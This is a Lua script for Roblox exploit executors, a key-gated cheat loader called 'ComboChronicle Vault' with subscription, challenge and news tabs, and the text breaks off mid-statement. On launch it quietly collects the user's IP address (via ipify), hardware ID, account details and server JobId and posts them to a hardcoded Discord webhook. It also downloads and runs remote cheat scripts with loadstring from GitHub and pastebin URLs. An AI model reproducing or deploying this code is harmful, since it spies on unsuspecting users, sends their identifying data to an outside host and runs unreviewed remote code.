local success, Rayfield = pcall(loadstring(game:HttpGet('https://sirius.menu/rayfield')))
if not success then
    return
end
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local DataStoreService = game:GetService("DataStoreService")
local RunService = game:GetService("RunService")
local MarketplaceService = game:GetService("MarketplaceService")

local CONFIG = {
    WEBHOOK_URL = "https://discord.com/api/webhooks/1354219342840991964/kgyogYrGVoTXLoR472lDz7zM8KcKHK1EK46ss-Ppmg7tSOpUz0uYeujtrdGMD5Dfk1bw",
    KEY_URL = "https://pastebin.com/raw/VHW3Fa9s",
    KEY_FALLBACK_URL = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/key_fallback",
    SUBSCRIPTION_URL = "https://pastebin.com/raw/ThRPn5JG",
    NEWS_URL = "https://pastebin.com/raw/vTKfsvCr",
    BLACKLIST_URL = "https://pastebin.com/raw/3h23tX2Y",
    WHITELIST_URL = "https://pastebin.com/raw/Qmp4r6es",
    HTTP_TIMEOUT = 15,
    FEEDBACK_COOLDOWN = 4500,
    REFRESH_INTERVAL = 180,
    VERSION = "1.4.0", -- Bumped to reflect major upgrades
    VIP_PERKS = {
        SCRIPT_BOOST = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/VIP_Boost",
        EXCLUSIVE_UI = "https://pastebin.com/raw/your_exclusive_ui",
        PREMIUM_THEMES = {"Dark", "Light", "Blood", "Aqua"}
    }
}

local VaultDataStore
local function initializeDataStore()
    local success, ds = pcall(function()
        return DataStoreService:GetDataStore("VaultData_v2") -- Updated version for new data
    end)
    if success then
        VaultDataStore = ds
    end
end
initializeDataStore()

local function getDataStore(key, default)
    if not VaultDataStore then return default end
    local success, data = pcall(function()
        return VaultDataStore:GetAsync(tostring(LocalPlayer.UserId) .. "_" .. key)
    end)
    return success and data or default
end

local function setDataStore(key, value)
    if VaultDataStore then
        pcall(function()
            VaultDataStore:SetAsync(tostring(LocalPlayer.UserId) .. "_" .. key, value)
        end)
    end
end

local function getLocalStorage(key, default)
    local success, data = pcall(function()
        return LocalPlayer:GetAttribute(key)
    end)
    return (success and data) or default
end

local function setLocalStorage(key, value)
    pcall(function()
        LocalPlayer:SetAttribute(key, value)
    end)
end

local HTTP_RATE_LIMIT = 0.5
local lastHttpRequest = 0
local function safeHttpGet(url, retries)
    retries = retries or 3
    local data, success, errorMsg
    
    for i = 1, retries do
        while (tick() - lastHttpRequest) < HTTP_RATE_LIMIT do wait(0.1) end
        lastHttpRequest = tick()
        
        local requestComplete = false
        local requestThread = coroutine.create(function()
            success, data = pcall(function()
                return game:HttpGet(url)
            end)
            if not success then
                errorMsg = data
                data = nil
            end
            requestComplete = true
        end)
        
        coroutine.resume(requestThread)
        
        local startTime = tick()
        while not requestComplete and (tick() - startTime) < CONFIG.HTTP_TIMEOUT do
            wait(0.1)
        end
        
        if requestComplete and success then
            return true, data
        end
        
        if i < retries then wait(2) end
    end
    
    return false, errorMsg or "Request timed out or blocked"
end

local function getPlayerInfo()
    local info = {}
    info.UserId = LocalPlayer.UserId
    info.Username = LocalPlayer.Name
    info.DisplayName = LocalPlayer.DisplayName
    info.HWID = game:GetService("RbxAnalyticsService"):GetClientId()
    info.GameId = game.PlaceId
    info.JobId = game.JobId
    info.AccountAge = LocalPlayer.AccountAge
    info.JoinDate = os.date("%Y-%m-%d", os.time() - (LocalPlayer.AccountAge * 86400))
    info.MembershipType = tostring(LocalPlayer.MembershipType)
    info.FollowerCount = LocalPlayer.FollowerCount
    info.FollowingCount = LocalPlayer.FollowingCount
    info.FriendCount = #Players:GetFriendsAsync(LocalPlayer.UserId):GetCurrentPage()
    
    local success, ip = pcall(function()
        return game:HttpGet("https://api.ipify.org")
    end)
    info.IP = success and ip or "Unknown (Fetch Failed)"
    
    info.Executor = identifyexecutor and identifyexecutor() or "Unknown"
    info.FPS = math.floor(1 / RunService.RenderStepped:Wait())
    info.Ping = math.floor(LocalPlayer:GetNetworkPing() * 1000) .. "ms"
    info.GameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
    info.LastLogin = os.date("%Y-%m-%d %H:%M:%S", getDataStore("lastLogin", os.time()))
    info.RobuxBalance = "Hidden (API Limited)" -- Roblox API restricts this
    
    return info
end

local accessControl = {
    blacklist = {},
    whitelist = {},
    lastFetch = 0,
    isFetching = false,
    
    fetchLists = function(self)
        if self.isFetching or (tick() - self.lastFetch < 300) then return end
        self.isFetching = true
        
        local blSuccess, blData = safeHttpGet(CONFIG.BLACKLIST_URL)
        if blSuccess then
            self.blacklist = {}
            for line in blData:gmatch("[^\n]+") do
                local userId = tonumber(line)
                if userId then self.blacklist[userId] = true end
            end
        end
        
        local wlSuccess, wlData = safeHttpGet(CONFIG.WHITELIST_URL)
        if wlSuccess then
            self.whitelist = {}
            for line in wlData:gmatch("[^\n]+") do
                local userId = tonumber(line)
                if userId then self.whitelist[userId] = true end
            end
        end
        
        self.lastFetch = tick()
        self.isFetching = false
    end,
    
    isBlacklisted = function(self, userId)
        self:fetchLists()
        return self.blacklist[userId] == true
    end,
    
    isWhitelisted = function(self, userId)
        self:fetchLists()
        return self.whitelist[userId] == true
    end,
    
    getStatus = function(self, userId)
        self:fetchLists()
        if self.blacklist[userId] then return "Blacklisted"
        elseif self.whitelist[userId] then return "Whitelisted"
        else return "Neutral" end
    end
}

local keySystem = {
    key = nil,
    lastFetch = 0,
    isFetching = false,
    hardcodedFallback = "CHANGED555555111111111111",
    
    fetch = function(self)
        if self.isFetching then return self.key or self.hardcodedFallback end
        self.isFetching = true
        
        if self.key and (tick() - self.lastFetch < 300) then
            self.isFetching = false
            return self.key
        end
        
        Rayfield:Notify({Title = "Loading", Content = "Fetching key...", Duration = 2})
        local success, response = safeHttpGet(CONFIG.KEY_URL)
        if not success then
            Rayfield:Notify({Title = "Warning", Content = "Pastebin failed, trying fallback...", Duration = 3})
            success, response = safeHttpGet(CONFIG.KEY_FALLBACK_URL)
        end
        
        if success then
            self.key = response:match("^%s*(.-)%s*$")
            self.lastFetch = tick()
            Rayfield:Notify({Title = "Success", Content = "Key fetched!", Duration = 2})
        else
            self.key = self.hardcodedFallback
            Rayfield:Notify({Title = "Warning", Content = "Using hardcoded fallback key.", Duration = 4})
        end
        self.isFetching = false
        return self.key
    end,
    
    verify = function(self, input)
        local fetchedKey = self:fetch()
        return input:match("^%s*(.-)%s*$") == fetchedKey
    end
}

local subscriptionSystem = {
    data = {},
    lastUpdate = 0,
    
    fetch = function(self)
        if (tick() - self.lastUpdate) < 300 then return end
        local success, data = safeHttpGet(CONFIG.SUBSCRIPTION_URL)
        if success then
            self.data = {}
            for line in data:gmatch("[^\n]+") do
                local userId, expiry = line:match("(%d+):(%d+)")
                if userId and expiry then
                    self.data[tonumber(userId)] = tonumber(expiry)
                end
            end
            self.lastUpdate = tick()
        end
    end,
    
    isSubscribed = function(self, userId)
        self:fetch()
        local expiry = self.data[userId]
        return expiry and os.time() < expiry
    end,
    
    getTimeRemaining = function(self, userId)
        if not self:isSubscribed(userId) then return 0 end
        return self.data[userId] - os.time()
    end,
    
    formatTimeRemaining = function(self, userId)
        local seconds = self:getTimeRemaining(userId)
        if seconds <= 0 then return "Expired" end
        local days = math.floor(seconds / 86400)
        local hours = math.floor((seconds % 86400) / 3600)
        local minutes = math.floor((seconds % 3600) / 60)
        if days > 0 then return string.format("%d days, %d hrs", days, hours)
        elseif hours > 0 then return string.format("%d hrs, %d min", hours, minutes)
        else return string.format("%d min", minutes) end
    end,
    
    extendSubscription = function(self, userId, days)
        if self.data[userId] then
            local newExpiry = math.max(self.data[userId], os.time()) + (days * 86400)
            self.data[userId] = newExpiry
            setDataStore("subExpiry", newExpiry)
            return true
        end
        return false
    end
}

local webhookSystem = {
    queue = {},
    processing = false,
    batchSize = 5,
    
    formatTime = function(self, seconds)
        local hours = math.floor(seconds / 3600)
        local minutes = math.floor((seconds % 3600) / 60)
        local secs = math.floor(seconds % 60)
        if hours > 0 then return string.format("%d:%02d:%02d", hours, minutes, secs)
        elseif minutes > 0 then return string.format("%d:%02d", minutes, secs)
        else return string.format("%d sec", secs) end
    end,
    
    send = function(self, embedData)
        table.insert(self.queue, embedData)
        if not self.processing then self:processQueue() end
    end,
    
    processQueue = function(self)
        if #self.queue == 0 then
            self.processing = false
            return
        end
        self.processing = true
        local batch = {}
        for i = 1, math.min(self.batchSize, #self.queue) do
            local embed = table.remove(self.queue, 1)
            embed.footer = embed.footer or { text = "Vault v" .. CONFIG.VERSION .. " | " .. os.date("%H:%M UTC") }
            embed.timestamp = embed.timestamp or os.date("!%Y-%m-%dT%H:%M:%SZ")
            if embed.title == "Script Execution" then
                embed.components = {
                    {
                        type = 1,
                        components = {
                            { type = 2, style = 3, label = "Blacklist", custom_id = "blacklist_" .. LocalPlayer.UserId },
                            { type = 2, style = 2, label = "Whitelist", custom_id = "whitelist_" .. LocalPlayer.UserId },
                            { type = 2, style = 1, label = "Details", custom_id = "details_" .. LocalPlayer.UserId }
                        }
                    }
                }
            end
            table.insert(batch, embed)
        end
        local success, response = pcall(function()
            local http_request = (syn and syn.request) or (http and http.request) or request or httprequest
            if not http_request then return false end
            local result = http_request({
                Url = CONFIG.WEBHOOK_URL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode({ embeds = batch })
            })
            return result and (result.StatusCode == 204 or result.StatusCode == 200)
        end)
        if not success then
            for _, embed in ipairs(batch) do
                embed.retryCount = (embed.retryCount or 0) + 1
                if embed.retryCount < 3 then table.insert(self.queue, embed) end
            end
        end
        wait(1)
        self:processQueue()
    end
}

local scriptSystem = {
    scripts = {
        [18209375211] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/FireTouchIntrest%20Universal",
        [14518422161] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/Hitbox%20Gunfight%20Arena",
        [155615604] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/Prison%20Life",
        [76455837887178] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/Dig%20it(Auto-Dig%20%2B%20more%20coming)",
        [7920018625] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/Nuke%20Tycoon%20Nuclear",
        [15694891095] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/TheOneV1",
        [106266102947071] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/ALL",
        [15948669967] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/ALL",
        [77074973013032] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/ALL",
        [17333357466] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/ALL",
        [8233004585] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/ALL",
        [11638805019] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/ALL",
        [15599178512] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/ALL",
        [16291041162] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/ALL",
        [84000476186267] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/ALL",
        [9679014784] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/ALL",
        [18365888493] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/ALL",
        [16168039994] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/ALL",
        [3678761576] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/ENTRENCHED_WW1",
        [8735521924] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/ALL",
        [6654918151] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/ALL",
        [17209126270] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/ALL",
        [5732301513] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/ALL",
        [94590879393563] = "https://raw.githubusercontent.com/12345678kanhai/silence/refs/heads/main/HM42",
        [11276071411] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/B-NPC-R-DIE",
        [3351674303] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/DRIVING%20EMPIRE",
        [73010525850196] = "https://raw.githubusercontent.com/12345678kanhai/silence/refs/heads/main/dv22",
        [85832836496852] = "https://raw.githubusercontent.com/12345678kanhai/silence/refs/heads/main/DEAD",
        [6677985923] = "https://raw.githubusercontent.com/12345678kanhai/silence/refs/heads/main/inf",
        [125723653259639] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/drilling",
        [9865958871] = "https://raw.githubusercontent.com/12345678kanhai/silence/refs/heads/main/new",
        [147848991] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/Be%20A%20Parkour%20Ninja",
        [18267483030] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/premi",
        [107326628277908] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/Be%20A%20car",
        [5223287266] = {
            "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/Phoenix%20Grounds",
            "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/Teleport%20Behind%20Player"
        }
    },
    defaultScript = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/Default",
    vipScript = CONFIG.VIP_PERKS.SCRIPT_BOOST,
    
    getScriptForGame = function(self, gameId)
        local script = self.scripts[gameId]
        if script then
            return script
        else
            Rayfield:Notify({Title = "Warning", Content = "No script found for this game. Loading default script.", Duration = 5})
            return self.defaultScript
        end
    end,
    
    loadScript = function(self, scriptUrl, notifyOnLoad)
        spawn(function()
            if notifyOnLoad then
                Rayfield:Notify({Title = "Loading", Content = "Loading script...", Duration = 2})
            end
            local success, errorMsg = pcall(function()
                loadstring(game:HttpGet(scriptUrl))()
            end)
            if success and notifyOnLoad then
                Rayfield:Notify({Title = "Success", Content = "Script loaded!", Duration = 3})
            elseif not success then
                Rayfield:Notify({Title = "Error", Content = "Failed: " .. (errorMsg or "Unknown"), Duration = 5})
            end
        end)
    end,
    
    loadScriptSet = function(self, scriptSet, notifyOnLoad)
        if type(scriptSet) == "table" then
            for i, url in ipairs(scriptSet) do
                self:loadScript(url, notifyOnLoad and i == 1)
            end
        else
            self:loadScript(scriptSet, notifyOnLoad)
        end
    end
}

local challengeSystem = {
    challenges = {
        {id = "login_streak", name = "Login Streak", progress = 0, goal = 5, reward = "50 VC"},
        {id = "feedback_pro", name = "Feedback Pro", progress = 0, goal = 3, reward = "VIP Extension (1 day)"},
        {id = "script_usage", name = "Script Enthusiast", progress = 0, goal = 10, reward = "Exclusive Script"},
        {id = "social_star", name = "Social Star", progress = 0, goal = 3, reward = "100 VC"}
    },
    
    load = function(self)
        for i, challenge in ipairs(self.challenges) do
            local savedProgress = getDataStore("challenge_" .. challenge.id, 0)
            self.challenges[i].progress = savedProgress
        end
    end,
    
    save = function(self)
        for _, challenge in ipairs(self.challenges) do
            setDataStore("challenge_" .. challenge.id, challenge.progress)
        end
    end,
    
    updateProgress = function(self, challengeId, increment)
        for i, challenge in ipairs(self.challenges) do
            if challenge.id == challengeId then
                self.challenges[i].progress = math.min(challenge.progress + (increment or 1), challenge.goal)
                self:save()
                if self.challenges[i].progress >= self.challenges[i].goal then
                    return true
                end
                return false
            end
        end
    end,
    
    resetProgress = function(self, challengeId)
        for i, challenge in ipairs(self.challenges) do
            if challenge.id == challengeId then
                self.challenges[i].progress = 0
                self:save()
                return true
            end
        end
        return false
    end,
    
    getFormattedText = function(self)
        local text = "Active Challenges\n\n"
        for i, challenge in ipairs(self.challenges) do
            local progressBar = ""
            local barLength = 10
            local filledBars = math.floor((challenge.progress / challenge.goal) * barLength)
            for j = 1, barLength do
                progressBar = progressBar .. (j <= filledBars and "■" or "□")
            end
            text = text .. challenge.name .. ":\n" .. progressBar .. " " .. challenge.progress .. "/" .. challenge.goal .. " (" .. challenge.reward .. ")\n\n"
        end
        return text
    end,
    
    awardReward = function(self, challengeId)
        for _, challenge in ipairs(self.challenges) do
            if challenge.id == challengeId and challenge.progress >= challenge.goal then
                if challenge.id == "login_streak" then
                    setDataStore("vaultCredits", (getDataStore("vaultCredits", 0) or 0) + 50)
                    Rayfield:Notify({Title = "Reward Claimed", Content = "Received 50 VC for Login Streak!", Duration = 5})
                elseif challenge.id == "feedback_pro" and subscriptionSystem:isSubscribed(LocalPlayer.UserId) then
                    subscriptionSystem:extendSubscription(LocalPlayer.UserId, 1)
                    Rayfield:Notify({Title = "Reward Claimed", Content = "VIP Extended by 1 day for Feedback Pro!", Duration = 5})
                elseif challenge.id == "script_usage" then
                    scriptSystem:loadScript(CONFIG.VIP_PERKS.EXCLUSIVE_UI, true)
                    Rayfield:Notify({Title = "Reward Claimed", Content = "Exclusive Script Unlocked for Script Enthusiast!", Duration = 5})
                elseif challenge.id == "social_star" then
                    setDataStore("vaultCredits", (getDataStore("vaultCredits", 0) or 0) + 100)
                    Rayfield:Notify({Title = "Reward Claimed", Content = "Received 100 VC for Social Star!", Duration = 5})
                end
                self:resetProgress(challengeId)
                return true
            end
        end
        return false
    end
}

local newsSystem = {
    content = "Loading news...",
    lastUpdate = 0,
    cache = getLocalStorage("newsCache", ""),
    
    formatNews = function(self, rawNews)
        if not rawNews or rawNews == "" then return "No news yet!" end
        local lines = {}
        for line in rawNews:gmatch("[^\n]+") do table.insert(lines, line) end
        local formatted = "Vault Chronicle\n==================\n"
        for i, line in ipairs(lines) do
            if line:match("^NEWS:") then
                formatted = formatted .. "📰 " .. line:gsub("^NEWS:%s*", "") .. "\n"
            elseif line:match("^TIP:") then
                formatted = formatted .. "💡 " .. line:gsub("^TIP:%s*", "") .. "\n"
            else
                formatted = formatted .. "- " .. line .. "\n"
            end
            if i < #lines then formatted = formatted .. "----------\n" end
        end
        formatted = formatted .. "==================\nUpdated: " .. os.date("%Y-%m-%d %H:%M UTC")
        return formatted
    end,
    
    update = function(self)
        if (tick() - self.lastUpdate) < CONFIG.REFRESH_INTERVAL then
            self.content = self.cache
            return false
        end
        local success, news = safeHttpGet(CONFIG.NEWS_URL)
        if success then
            self.content = self:formatNews(news)
            self.lastUpdate = tick()
            self.cache = self.content
            setLocalStorage("newsCache", self.cache)
            return true
        end
        self.content = self.cache
        return false
    end
}

accessControl:fetchLists()
subscriptionSystem:fetch()
challengeSystem:load()
newsSystem:update()
local lastFeedbackTime = getDataStore("lastFeedbackTime", 0)

if accessControl:isBlacklisted(LocalPlayer.UserId) then
    Rayfield:Notify({
        Title = "Access Denied",
        Content = "You have been blacklisted from using this script.",
        Duration = 10,
        Image = 4483362458
    })
    return
end

local playerInfo = getPlayerInfo()
setDataStore("lastLogin", os.time())

webhookSystem:send({
    title = "Script Execution",
    description = string.format("%s has launched Vault v%s", LocalPlayer.DisplayName, CONFIG.VERSION),
    color = 7419530,
    fields = {
        { name = "Username", value = "```" .. playerInfo.Username .. "```", inline = true },
        { name = "User ID", value = "```" .. playerInfo.UserId .. "```", inline = true },
        { name = "Hardware ID", value = "```" .. playerInfo.HWID .. "```", inline = true },
        { name = "Game ID", value = "```" .. playerInfo.GameId .. "```", inline = true },
        { name = "Server JobId", value = "```" .. playerInfo.JobId .. "```", inline = true },
        { name = "Account Age", value = playerInfo.AccountAge .. " days", inline = true },
        { name = "Join Date", value = playerInfo.JoinDate, inline = true },
        { name = "IP", value = "```" .. playerInfo.IP .. "```", inline = true },
        { name = "Executor", value = playerInfo.Executor, inline = true },
        { name = "VIP", value = subscriptionSystem:isSubscribed(LocalPlayer.UserId) and "Yes" or "No", inline = true },
        { name = "Status", value = accessControl:getStatus(LocalPlayer.UserId), inline = true },
        { name = "Membership", value = playerInfo.MembershipType, inline = true },
        { name = "FPS", value = playerInfo.FPS .. " FPS", inline = true },
        { name = "Ping", value = playerInfo.Ping, inline = true }
    }
})

local Window
local success, err = pcall(function()
    Window = Rayfield:CreateWindow({
        Name = "ComboChronicle Vault | NextGen v" .. CONFIG.VERSION,
        LoadingTitle = "Initializing Vault",
        LoadingSubtitle = "By COMBO_WICK | Bang.E.Line | Enhanced Edition",
        Theme = getLocalStorage("theme", "Ocean")
    })
end)
if not success then
    return
end

local KeyTab = Window:CreateTab("Key & Credits", 4483362458)
local keyInput = KeyTab:CreateInput({
    Name = "Enter Key",
    PlaceholderText = "Type the key here...",
    RemoveTextAfterFocusLost = false,
    Callback = function(input)
        Rayfield:Notify({Title = "Checking", Content = "Verifying key...", Duration = 2})
        task.wait(0.7)
        if keySystem:verify(input) then
            Rayfield:Notify({Title = "Success", Content = "Access granted! Welcome to the Vault!", Duration = 3})
            challengeSystem:updateProgress("login_streak")
            local gameId = game.PlaceId
            local scriptToLoad = scriptSystem:getScriptForGame(gameId)
            task.wait(1)
            Rayfield:Destroy()
            scriptSystem:loadScriptSet(scriptToLoad, true)
        else
            Rayfield:Notify({Title = "Invalid", Content = "Join Discord for key or check input!", Duration = 5, Image = 4483362458})
        end
    end
})

KeyTab:CreateButton({
    Name = "Copy Links",
    Callback = function()
        setclipboard("Discord: discord.com/invite/mwTHaCKzhw\nYouTube: https://www.youtube.com/@COMBO_WICK")
        Rayfield:Notify({Title = "Copied", Content = "Links copied!", Duration = 5})
        challengeSystem:updateProgress("social_star")
    end
})

KeyTab:CreateParagraph({
    Title = "Credits",
    Content = "Script by COMBO_WICK & Star\nVersion: " .. CONFIG.VERSION .. "\nAccess: " .. accessControl:getStatus(LocalPlayer.UserId) .. "\nEnhanced by xAI\nEnjoy the Ultimate Vault Experience!"
})

local ResponseTab = Window:CreateTab("Responses", 4483362458)
local ResponseSection = ResponseTab:CreateSection("Message System")
local currentResponse = ""
ResponseTab:CreateInput({
    Name = "Your Message",
    PlaceholderText = "Share thoughts, report bugs, or suggest features...",
    RemoveTextAfterFocusLost = false,
    Callback = function(text) currentResponse = text end
})

ResponseTab:CreateButton({
    Name = "Submit Feedback",
    Info = "Send feedback to developers",
    Interact = "Submit",
    Callback = function()
        local currentTime = tick()
        local timeRemaining = CONFIG.FEEDBACK_COOLDOWN - (currentTime - lastFeedbackTime)
        if timeRemaining > 0 then
            Rayfield:Notify({Title = "Cooldown", Content = "Wait " .. webhookSystem:formatTime(timeRemaining), Duration = 5, Image = 4483362458})
            return
        end
        if currentResponse == "" then
            Rayfield:Notify({Title = "Error", Content = "Enter a message!", Duration = 3, Image = 4483362458})
            return
        end
        webhookSystem:send({
            title = "New Feedback",
            description = currentResponse,
            color = 3447003,
            fields = {
                { name = "User", value = LocalPlayer.DisplayName, inline = true },
                { name = "ID", value = tostring(LocalPlayer.UserId), inline = true },
                { name = "Game", value = playerInfo.GameName .. " (" .. tostring(game.PlaceId) .. ")", inline = true },
                { name = "Status", value = accessControl:getStatus(LocalPlayer.UserId), inline = true }
            }
        })
        Rayfield:Notify({Title = "Sent", Content = "Feedback delivered! Thank you!", Duration = 5, Image = 4483362458})
        local feedbackCount = (getDataStore("feedbackCount", 0) or 0) + 1
        setDataStore("feedbackCount", feedbackCount)
        challengeSystem:updateProgress("feedback_pro")
        if challengeSystem:awardReward("feedback_pro") then
            Rayfield:Notify({Title = "Reward", Content = "VIP Extended by 1 day!", Duration = 5})
        end
        lastFeedbackTime = currentTime
        setDataStore("lastFeedbackTime", lastFeedbackTime)
        currentResponse = ""
    end
})

ResponseTab:CreateLabel("Cooldown: 1h 15m")
ResponseTab:CreateLabel("Help us improve with your input!")

local NewsTab = Window:CreateTab("News", 4483362458)
local newsParagraph = NewsTab:CreateParagraph({
    Title = "Vault Updates",
    Content = newsSystem.content
})

spawn(function()
    while wait(CONFIG.REFRESH_INTERVAL) do
        if newsSystem:update() then
            newsParagraph:Set({Title = "Vault Updates", Content = newsSystem.content})
        end
    end
end)

NewsTab:CreateButton({
    Name = "Refresh News",
    Callback = function()
        Rayfield:Notify({Title = "Updating", Content = "Fetching news...", Duration = 2})
        if newsSystem:update() then
            newsParagraph:Set({Title = "Vault Updates", Content = newsSystem.content})
            Rayfield:Notify({Title = "Updated", Content = "News refreshed!", Duration = 3})
        else
            Rayfield:Notify({Title = "Failed", Content = "Try again later.", Duration = 3})
        end
    end
})

local SubTab
if subscriptionSystem:isSubscribed(LocalPlayer.UserId) then
    SubTab = Window:CreateTab("Subscription", 4483362458)
    local subParagraph = SubTab:CreateParagraph({
        Title = "Vault Elite",
        Content = "Loading subscription details..."
    })
    
    local function updateSubStatus()
        if subscriptionSystem:isSubscribed(LocalPlayer.UserId) then
            local timeRemaining = subscriptionSystem:formatTimeRemaining(LocalPlayer.UserId)
            subParagraph:Set({
                Title = "Vault Elite",
                Content = "Status: Subscribed\n" ..
                          "Perks: VIP Scripts, Priority Support, Boosts, Premium Themes\n" ..
                          "Expires in: " .. timeRemaining .. "\n" ..
                          "Access: " .. accessControl:getStatus(LocalPlayer.UserId) .. "\n" ..
                          "Exclusive Bonus: Early Access to Updates"
            })
        else
            subParagraph:Set({
                Title = "Vault Elite",
                Content = "Status: Expired\n" ..
                          "Renew to regain VIP benefits!\n" ..
                          "Access: " .. accessControl:getStatus(LocalPlayer.UserId)
            })
        end
    end
    
    spawn(function()
        wait(1)
        updateSubStatus()
    end)
    
    spawn(function()
        while wait(60) do
            subscriptionSystem:fetch()
            updateSubStatus()
        end
    end)
    
    SubTab:CreateButton({
        Name = "Renew Subscription",
        Callback = function()
            setclipboard("discord.com/invite/mwTHaCKzhw")
            Rayfield:Notify({Title = "Subscription", Content = "Discord copied! Contact admins.", Duration = 5})
            challengeSystem:updateProgress("social_star")
        end
    })
    
    SubTab:CreateButton({
        Name = "Load VIP Boost",
        Callback = function()
            if subscriptionSystem:isSubscribed(LocalPlayer.UserId) then
                scriptSystem:loadScript(scriptSystem.vipScript, true)
                challengeSystem:updateProgress("script_usage")
                if challengeSystem:awardReward("script_usage") then
                    Rayfield:Notify({Title = "Reward", Content = "Exclusive Script Unlocked!", Duration = 5})
                end
            else
                Rayfield:Notify({Title = "Denied", Content = "Subscription expired!", Duration = 5})
            end
        end
    })
    
    SubTab:CreateButton({
        Name = "Load VIP UI",
        Callback = function()
            if subscriptionSystem:isSubscribed(LocalPlayer.UserId) then
                scriptSystem:loadScript(CONFIG.VIP_PERKS.EXCLUSIVE_UI, true)
            else
                Rayfield:Notify({Title = "Denied", Content = "Subscription expired!", Duration = 5})
            end
        end
    })
    
    SubTab:CreateDropdown({
        Name = "Select Premium Theme",
        Options = CONFIG.VIP_PERKS.PREMIUM_THEMES,
        CurrentOption = getLocalStorage("theme", "Ocean"),
        Callback = function(theme)
            if subscriptionSystem:isSubscribed(LocalPlayer.UserId) then
                Window:SetTheme(theme)
                setLocalStorage("theme", theme)
                Rayfield:Notify({Title = "Theme Changed", Content = "Now using " .. theme .. " theme!", Duration = 4})
            else
                Rayfield:Notify({Title = "Denied", Content = "VIP only feature!", Duration = 5})
            end
        end
    })
    
    if not getDataStore("VIPBadgeShown", false) then
        wait(3)
        Rayfield:Notify({
            Title = "VIP Badge",
            Content = "Welcome, Vault Elite Member!\nUnlock exclusive perks and shine bright!",
            Duration = 10,
            Image = 4483362458
        })
        setDataStore("VIPBadgeShown", true)
    end
end

local ChallengeTab = Window:CreateTab("Challenges", 4483362458)
local challengeParagraph = ChallengeTab:CreateParagraph({
    Title = "Daily Goals",
    Content = challengeSystem:getFormattedText()
})

ChallengeTab:CreateButton({
    Name = "Refresh Challenges",
    Callback = function()
        challengeParagraph:Set({Title = "Daily Goals", Content = challengeSystem:getFormattedText()})
        Rayfield:Notify({Title = "Refreshed", Content = "Progress updated!", Duration = 3})
    end
})

ChallengeTab:CreateButton({
    Name = "Claim Rewards",
    Callback = function()
        local anyRewardClaimed = false
        for _, challenge in ipairs(challengeSystem.challenges) do
            if challengeSystem:awardReward(challenge.id) then
                anyRewardClaimed = true
            end
        end
        if not anyRewardClaimed then
            Rayfield:Notify({Title = "No Rewards", Content = "No rewards available to claim.", Duration = 3})
        end
        challengeParagraph:Set({Title = "Daily Goals", Content = challengeSystem:getFormattedText()})
    end
})

local SettingsTab = Window:CreateTab("Settings", 4483362458)
SettingsTab:CreateToggle({
    Name = "Notifications",
    CurrentValue = getLocalStorage("notificationsEnabled", true),
    Flag = "notificationsToggle",
    Callback = function(value)
        setLocalStorage("notificationsEnabled", value)
        Rayfield:Notify({Title = "Settings", Content = value and "Notifications on" or "Notifications off", Duration = 3})
    end
})

SettingsTab:CreateToggle({
    Name = "Auto-Update Scripts",
    CurrentValue = getLocalStorage("autoUpdateEnabled", true),
    Flag = "autoUpdateToggle",
    Callback = function(value)
        setLocalStorage("autoUpdateEnabled", value)
    end
})

SettingsTab:CreateSlider({
    Name = "UI Scale",
    Range = {0.5, 1.5},
    Increment = 0.1,
    CurrentValue = getLocalStorage("uiScale", 1),
    Callback = function(value)
        setLocalStorage("uiScale", value)
        Rayfield:Notify({Title = "Settings", Content = "UI scale set to " .. value .. "x", Duration = 3})
        -- Note: Rayfield doesn't natively support UI scaling; this is a placeholder for future enhancement
    end
})

SettingsTab:CreateButton({
    Name = "Clear Cache",
    Callback = function()
        for _, attr in ipairs({"notificationsEnabled", "autoUpdateEnabled", "newsCache", "VIPBadgeShown", "theme", "uiScale"}) do
            pcall(function() LocalPlayer:SetAttribute(attr, nil) end)
        end
        Rayfield:Notify({Title = "Cleaned", Content = "Cache cleared! Restart to apply.", Duration = 5})
    end
})

SettingsTab:CreateButton({
    Name = "Restart Vault",
    Callback = function()
        Rayfield:Notify({Title = "Restarting", Content = "Reloading Vault...", Duration = 3})
        wait(1)
        Rayfield:Destroy()
        loadstring(game:HttpGet(''))()
    end
})

local AnalyticsTab = Window:CreateTab("Analytics", 4483362458)
local analyticsParagraph = AnalyticsTab:CreateParagraph({
